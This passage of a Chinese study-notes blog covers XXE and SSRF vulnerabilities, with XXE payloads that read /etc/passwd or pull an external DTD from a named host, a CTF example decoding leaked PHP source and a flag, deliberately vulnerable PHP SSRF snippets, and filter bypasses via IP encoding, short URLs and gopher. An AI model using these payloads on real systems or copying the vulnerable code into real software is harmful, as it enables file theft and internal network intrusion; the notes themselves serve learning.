<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;&#x2F;to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;&#x2F;from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;&#x2F;heading&gt;</span><br><span class="line">&lt;body&gt;Don&#39;t forget me this weekend!&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>

<h5 id="3-XML-DTD-（重点）"><a href="#3-XML-DTD-（重点）" class="headerlink" title="3.XML DTD （重点）"></a>3.XML DTD （重点）</h5><p>​         DTD全称为，Document Type Definition，中文翻译为文档类型定义，是一套为了进行程序间的数据交换而建立的关于标记符的语法规则。<br>​        文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 有两种声明的方法，一种是内部声明，一种是外部声明，我们下面开具体看一下：<br><strong>DTD的外部声明：</strong><br>外部需要一个DTD的文件，比如：note.dtc</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;&#x2F;to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;&#x2F;from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;&#x2F;heading&gt;</span><br><span class="line">&lt;body&gt;Don&#39;t forget me this weekend!&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>

<p><strong>DTD 的内部声明:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY content SYSTEM &quot;filename&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"> &lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;&#x2F;to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;&#x2F;from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;&#x2F;heading&gt;</span><br><span class="line">&lt;body&gt;Don&#39;t forget me this weekend!&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>

<h3 id="•XXE漏洞成因"><a href="#•XXE漏洞成因" class="headerlink" title="•XXE漏洞成因"></a><strong>•XXE漏洞成因</strong></h3><p>​        XML数据在传输中数据被修改，服务器执行被恶意插入的代码，最终实现攻击的目的，XXE漏洞就是在XML在外部声明的时候出现了问题。看一下修改后的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY content SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; # 直接读取系统的文件</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;name&gt;&amp;content;&lt;&#x2F;name&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>

<h5 id="怎样构建外部实体注入："><a href="#怎样构建外部实体注入：" class="headerlink" title="怎样构建外部实体注入："></a><strong>怎样构建外部实体注入：</strong></h5><p><strong>（1）直接通过DTD外部实体声明</strong></p>
<p>XML内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY content SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;</span><br></pre></td></tr></table></figure>

<p><strong>（2）通过DTD文档引入外部DTD文档，再引入外部实体声明</strong></p>
<p>XML内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a SYSTEM &quot;http:&#x2F;&#x2F;mark4z5.com&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;</span><br></pre></td></tr></table></figure>

<p>DTD文件内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; </span><br></pre></td></tr></table></figure>

<p><strong>（3）通过DTD外部实体声明引入外部实体声明</strong></p>
<p>XML内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">   &lt;!ENTITY % d SYSTEM &quot;http:&#x2F;&#x2F;mark4z5.com&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">   %d;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;</span><br></pre></td></tr></table></figure>

<p>DTD文件内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; </span><br></pre></td></tr></table></figure>

<h5 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h5><p>134.175.168.213:28100</p>
<p>查看页面源码</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201120135131233.png"></p>
<p>发现存在index.php文件</p>
<p>使用php伪协议读取index.php </p>
<p>使用Burp Suite进行抓包</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201120142653285.png"></p>
<p>得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCmxpYnhtbF9kaXNhYmxlX2VudGl0eV9sb2FkZXIoZmFsc2UpOw0KJGRhdGEgPSBAZmlsZV9nZXRfY29udGVudHMoJ3BocDovL2lucHV0Jyk7DQokcmVzcCA9ICcnOw0KLy8kZmxhZz0nZmxhZ3s3OWQxMDYyNi1kMjdmLTQ1NjktYTYyOS1jOTYwNmQwMzc4ZjJ9JzsNCmlmKCRkYXRhICE9IGZhbHNlKXsNCiAgICAkZG9tID0gbmV3IERPTURvY3VtZW50KCk7DQogICAgJGRvbS0+bG9hZFhNTCgkZGF0YSwgTElCWE1MX05PRU5UKTsNCiAgICBvYl9zdGFydCgpOw0KICAgICRyZXMgID0gJGRvbS0+dGV4dENvbnRlbnQ7DQogICAgJHJlc3AgPSBvYl9nZXRfY29udGVudHMoKTsNCiAgICBvYl9lbmRfY2xlYW4oKTsNCiAgICBpZiAoJHJlcyl7DQogICAgICAgIGRpZSgkcmVzKTsNCiAgICB9DQoNCn0NCj8+DQo8IURPQ1RZUEUgaHRtbD4NCjxodG1sIGxhbmc9ImVuIj4NCjxoZWFkPg0KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4NCiAgICA8dGl0bGU+d2VsY29tZTwvdGl0bGU+DQogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIuL3N0eWxlLmNzcyI+DQogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPg0KICAgIDxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29tcGF0aWJsZSIgY29udGVudD0iaWU9ZWRnZSI+DQoNCjwvaGVhZD4NCjxib2R5IGNsYXNzPSJjb250YWN0Qm9keSI+DQo8ZGl2IGNsYXNzPSJ3cmFwcGVyIj4NCiAgICA8ZGl2IGNsYXNzPSJ0aXRsZSI+DQoNCg0KICAgIDwvZGl2Pg0KDQoNCiAgICA8Zm9ybSBtZXRob2Q9InBvc3QiIGNsYXNzPSJmb3JtIj4NCiAgICAgICAgPGgxIGlkPSJ0aXRsZSI+6K+36L6T5YWl5aeT5ZCNPC9oMT4NCiAgICAgICAgPGJyLz4NCiAgICAgICAgPGJyLz4NCiAgICAgICAgPGJyLz4NCiAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJuYW1lIGVudHJ5ICIgaWQ9Im5hbWUiIG5hbWU9Im5hbWUiIHBsYWNlaG9sZGVyPSJZb3VyIE5hbWUiLz4NCiAgICA8L2Zvcm0+DQogICAgPGJ1dHRvbiBjbGFzcz0ic3VibWl0IGVudHJ5IiBvbmNsaWNrPSJmdW5jKCkiPlN1Ym1pdDwvYnV0dG9uPg0KDQogICAgPGRpdiBjbGFzcz0ic2hhZG93Ij48L2Rpdj4NCjwvZGl2Pg0KDQo8L2JvZHk+DQo8L2h0bWw+DQo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+DQogICAgZnVuY3Rpb24gcGxheSgpIHsNCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCiAgICBmdW5jdGlvbiBmdW5jKCkgew0KICAgICAgICAvLyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgpLnZhbHVlDQogICAgICAgIHZhciB4bWwgPSAnJyArDQogICAgICAgICAgICAnPFw&#x2F;eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ilw&#x2F;PicgKw0KICAgICAgICAgICAgJzxmZWVkYmFjaz4nICsNCiAgICAgICAgICAgICc8YXV0aG9yPicgKyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbmFtZScpLnZhbHVlKyAnPC9hdXRob3I+JyArDQogICAgICAgICAgICAnPC9mZWVkYmFjaz4nOw0KICAgICAgICBjb25zb2xlLmxvZyh4bWwpOw0KICAgICAgICB2YXIgeG1saHR0cCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOw0KICAgICAgICB4bWxodHRwLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uICgpIHsNCiAgICAgICAgICAgIGlmICh4bWxodHRwLnJlYWR5U3RhdGUgPT0gNCkgew0KICAgICAgICAgICAgICAgIC8vIGNvbnNvbGUubG9nKHhtbGh0dHAucmVhZHlTdGF0ZSk7DQogICAgICAgICAgICAgICAgLy8gY29uc29sZS5sb2coeG1saHR0cC5yZXNwb25zZVRleHQpOw0KICAgICAgICAgICAgICAgIHZhciByZXMgPSB4bWxodHRwLnJlc3BvbnNlVGV4dDsNCiAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndGl0bGUnKS50ZXh0Q29udGVudCA9IHJlcw0KICAgICAgICAgICAgfQ0KICAgICAgICB9Ow0KICAgICAgICB4bWxodHRwLm9wZW4oIlBPU1QiLCAiaW5kZXgucGhwIiwgdHJ1ZSk7DQogICAgICAgIHhtbGh0dHAuc2VuZCh4bWwpOw0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfTsNCjwvc2NyaXB0Pg0KPC9ib2R5Pg0KPC9odG1sPg&#x3D;&#x3D;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对获取的字符串进行base64解码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader(false);</span><br><span class="line">$data &#x3D; @file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);</span><br><span class="line">$resp &#x3D; &#39;&#39;;</span><br><span class="line">&#x2F;&#x2F;$flag&#x3D;&#39;flag&#123;79d10626-d27f-4569-a629-c9606d0378f2&#125;&#39;;</span><br><span class="line">if($data !&#x3D; false)&#123;</span><br><span class="line">    $dom &#x3D; new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    $res  &#x3D; $dom-&gt;textContent;</span><br><span class="line">    $resp &#x3D; ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    if ($res)&#123;</span><br><span class="line">        die($res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;welcome&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;.&#x2F;style.css&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body class&#x3D;&quot;contactBody&quot;&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;wrapper&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;title&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;form method&#x3D;&quot;post&quot; class&#x3D;&quot;form&quot;&gt;</span><br><span class="line">        &lt;h1 id&#x3D;&quot;title&quot;&gt;请输入姓名&lt;&#x2F;h1&gt;</span><br><span class="line">        &lt;br&#x2F;&gt;</span><br><span class="line">        &lt;br&#x2F;&gt;</span><br><span class="line">        &lt;br&#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;name entry &quot; id&#x3D;&quot;name&quot; name&#x3D;&quot;name&quot; placeholder&#x3D;&quot;Your Name&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;button class&#x3D;&quot;submit entry&quot; onclick&#x3D;&quot;func()&quot;&gt;Submit&lt;&#x2F;button&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class&#x3D;&quot;shadow&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">    function play() &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    function func() &#123;</span><br><span class="line">        &#x2F;&#x2F; document.getElementById().value</span><br><span class="line">        var xml &#x3D; &#39;&#39; +</span><br><span class="line">            &#39;&lt;\?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;\?&gt;&#39; +</span><br><span class="line">            &#39;&lt;feedback&gt;&#39; +</span><br><span class="line">            &#39;&lt;author&gt;&#39; + document.getElementById(&#39;name&#39;).value+ &#39;&lt;&#x2F;author&gt;&#39; +</span><br><span class="line">            &#39;&lt;&#x2F;feedback&gt;&#39;;</span><br><span class="line">        console.log(xml);</span><br><span class="line">        var xmlhttp &#x3D; new XMLHttpRequest();</span><br><span class="line">        xmlhttp.onreadystatechange &#x3D; function () &#123;</span><br><span class="line">            if (xmlhttp.readyState &#x3D;&#x3D; 4) &#123;</span><br><span class="line">                &#x2F;&#x2F; console.log(xmlhttp.readyState);</span><br><span class="line">                &#x2F;&#x2F; console.log(xmlhttp.responseText);</span><br><span class="line">                var res &#x3D; xmlhttp.responseText;</span><br><span class="line">                document.getElementById(&#39;title&#39;).textContent &#x3D; res</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        xmlhttp.open(&quot;POST&quot;, &quot;index.php&quot;, true);</span><br><span class="line">        xmlhttp.send(xml);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>得到源代码和flag.</p>
<h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><h3 id="•什么是SSRF漏洞"><a href="#•什么是SSRF漏洞" class="headerlink" title="•什么是SSRF漏洞"></a>•什么是SSRF漏洞</h3><p>​        ssrf(Sever-Side Request Forgery,服务器端请求伪造)是一种由攻击者构造攻击链传给服务器，服务端执行并发起请求造成安全问题的漏洞，一般用来在外网探测或攻击内网服务。</p>
<h3 id="•怎么寻找存在SSRF漏洞"><a href="#•怎么寻找存在SSRF漏洞" class="headerlink" title="•怎么寻找存在SSRF漏洞"></a>•怎么寻找存在SSRF漏洞</h3><ul>
<li>分享：通过URL分享网页内容</li>
<li>转码服务：通过url地址把原地址的网页内容调优使得适合手机屏幕浏览</li>
<li>在线翻译：通过url地址翻译对应的文本内容，例如 百度 有道</li>
<li>图片加载与下载  通过url地址加载或者下载图片</li>
<li>图片、文章的收藏功能</li>
<li>未公开的api实现以及其他调用url的功能</li>
<li>从url关键字中寻找：share、wap、url、link、src、source、target、u、3g、dispaly、sourceURI、ImageURL、domain……</li>
</ul>
<h3 id="•产生SSRF的PHP函数"><a href="#•产生SSRF的PHP函数" class="headerlink" title="•产生SSRF的PHP函数"></a>•产生SSRF的PHP函数</h3><ul>
<li>file_get_contents()</li>
<li>fsockopen()</li>
<li>curl_exec()</li>
</ul>
<h5 id="1-file-get-contents-函数造成的ssrf"><a href="#1-file-get-contents-函数造成的ssrf" class="headerlink" title="1.file_get_contents()函数造成的ssrf"></a>1.<strong>file_get_contents()函数造成的ssrf</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">function curl($url)&#123;</span><br><span class="line">	$ch &#x3D; curl_init();&#x2F;&#x2F;初始化一个新的curl会话，返回一个curl句柄</span><br><span class="line">	curl_setopt($ch, CURLOPT_URL,$url);&#x2F;&#x2F;设置一个curl传输选项，需要获取的url地址</span><br><span class="line">	curl_setopt($ch, CURLOPT_HEADER,0);&#x2F;&#x2F;启动时候将头文件的信息作为数据流输出</span><br><span class="line">	curl_exec($ch);&#x2F;&#x2F;执行一个curl会话</span><br><span class="line">	curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">curl($url);</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>  file_get_contents：文件写入字符串，当url是内网文件的时候，会先去把这个文件的内容读出来再写入，导致了文件读取。</p>
<h5 id="2-fsockopen-函数造成的ssrf"><a href="#2-fsockopen-函数造成的ssrf" class="headerlink" title="2.fsockopen()函数造成的ssrf"></a>2.<strong>fsockopen()函数造成的ssrf</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">function getfile($host,$port,$link)&#123;</span><br><span class="line">	$fp &#x3D; fsockopen($host,intval($port),$errno,$errstr,30);&#x2F;&#x2F;打开一个网络连接或者一个unix套接字连接</span><br><span class="line">	if(!$fp)&#123;</span><br><span class="line">		echo &quot;$errstr (error number $errno) \n&quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line"> </span><br><span class="line">		$out &#x3D; &quot;GET $link HTTP&#x2F;1.1\r\n&quot;;</span><br><span class="line">		$out.&#x3D;&quot;HOST $host \r\n&quot;;</span><br><span class="line">		$out.&#x3D;&quot;Connection:Close\r\n\r\n&quot;;</span><br><span class="line">		$out.&#x3D;&quot;\r\n&quot;;</span><br><span class="line">		fwrite($fp, $out);</span><br><span class="line">		$content &#x3D; &#39;&#39;;</span><br><span class="line">		while (!feof($fp)) &#123; &#x2F;&#x2F;检查是否已经达到文件末尾</span><br><span class="line">			$contents .&#x3D; fgets($fp,1024);</span><br><span class="line">			# code...</span><br><span class="line">		&#125;</span><br><span class="line">		fclose($fp)mianshiti </span><br><span class="line">		return $contents;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">echo(getfile(&quot;127.0.0.1&quot;,&quot;80&quot;,&quot;index.php&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="3-curl-exec-函数造成的ssrf漏洞"><a href="#3-curl-exec-函数造成的ssrf漏洞" class="headerlink" title="3.curl_exec()函数造成的ssrf漏洞"></a>3.<strong>curl_exec()函数造成的ssrf漏洞</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">function curl($url)&#123;</span><br><span class="line">	$ch &#x3D; curl_init();&#x2F;&#x2F;初始化一个新的curl会话，返回一个curl句柄</span><br><span class="line">	curl_setopt($ch, CURLOPT_URL,$url);&#x2F;&#x2F;设置一个curl传输选项，需要获取的url地址</span><br><span class="line">	curl_setopt($ch, CURLOPT_HEADER,0);&#x2F;&#x2F;启动时候将头文件的信息作为数据流输出</span><br><span class="line">	curl_exec($ch);&#x2F;&#x2F;执行一个curl会话</span><br><span class="line">	curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">curl($url);</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="•绕过协议"><a href="#•绕过协议" class="headerlink" title="•绕过协议"></a>•绕过协议</h3><h5 id="1-ip地址转换绕过"><a href="#1-ip地址转换绕过" class="headerlink" title="1.ip地址转换绕过"></a>1.ip地址转换绕过</h5><p>192.168.0.1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(1)、8进制格式：0300.0250.0.1</span><br><span class="line">(2)、16进制格式：0xC0.0xA8.0.1</span><br><span class="line">(3)、10进制整数格式：3232235521</span><br><span class="line">(4)、16进制整数格式：0xC0A80001</span><br></pre></td></tr></table></figure>

<h5 id="2-短网址绕过"><a href="#2-短网址绕过" class="headerlink" title="2.短网址绕过"></a>2.短网址绕过</h5><p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201120215420079.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201120215444639.png"></p>
<p>​     即<a target="_blank" rel="noopener" href="http://www.baidu.com与http//x8r.cn/uhOYzn">www.baidu.com与http://x8r.cn/uhOYzn</a> 是一样的</p>
<h5 id="3-gopher协议"><a href="#3-gopher协议" class="headerlink" title="3.gopher协议"></a>3.gopher协议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式：URL:gopher:&#x2F;&#x2F;&lt;host&gt;:&lt;port&gt;&#x2F;&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure>

<p>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</p>
<ul>
<li>gopher的默认端口是70</li>
<li>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://ggken753.github.io/2020/11/17/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06/" data-id="ckhpm2jij0000ckv33ip89gql" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-学习笔记5" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/11/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05/" class="article-date">
  <time datetime="2020-11-14T16:00:00.000Z" itemprop="datePublished">2020-11-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/11/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05/">SQL注入</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>#SQL注入的概述</p>
